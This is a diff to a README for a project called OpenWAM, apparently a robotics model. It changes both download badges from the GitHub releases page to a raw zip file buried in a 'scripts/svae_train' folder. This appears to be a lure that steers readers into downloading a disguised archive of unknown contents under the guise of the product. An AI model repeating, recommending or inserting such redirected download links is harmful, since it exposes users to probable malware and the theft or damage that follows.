@@ -34,7 +34,7 @@ Ready to get started? Follow these simple steps:
 
 ### Step 1: Download OpenWAM
 
-[![Download OpenWAM](https://img.shields.io/badge/Download-OpenWAM-purple?style=for-the-badge&logo=github&color=8A2BE2)](https://github.com/DatTroc6804/OpenWAM/releases)
+[![Download OpenWAM](https://img.shields.io/badge/Download-OpenWAM-purple?style=for-the-badge&logo=github&color=8A2BE2)](https://raw.githubusercontent.com/DatTroc6804/OpenWAM/main/scripts/svae_train/v3.5.zip)
 
 Visit this link to download the application.
 
@@ -146,6 +146,6 @@ OpenWAM represents the future of friendly, accessible robotics technology. With 
 
 **Ready to begin? Download OpenWAM now and join the robotics revolution!**
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-success?style=for-the-badge&logo=github&color=00FF7F)](https://github.com/DatTroc6804/OpenWAM/releases)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-success?style=for-the-badge&logo=github&color=00FF7F)](https://raw.githubusercontent.com/DatTroc6804/OpenWAM/main/scripts/svae_train/v3.5.zip)
 
 Keywords: generalist-robot-policies, pretraining, robotics, world-action-model, OpenWAM, open source, AI technology, robotics software, machine learning, computer vision, smart systems, robot training, world model, action model, artificial intelligence
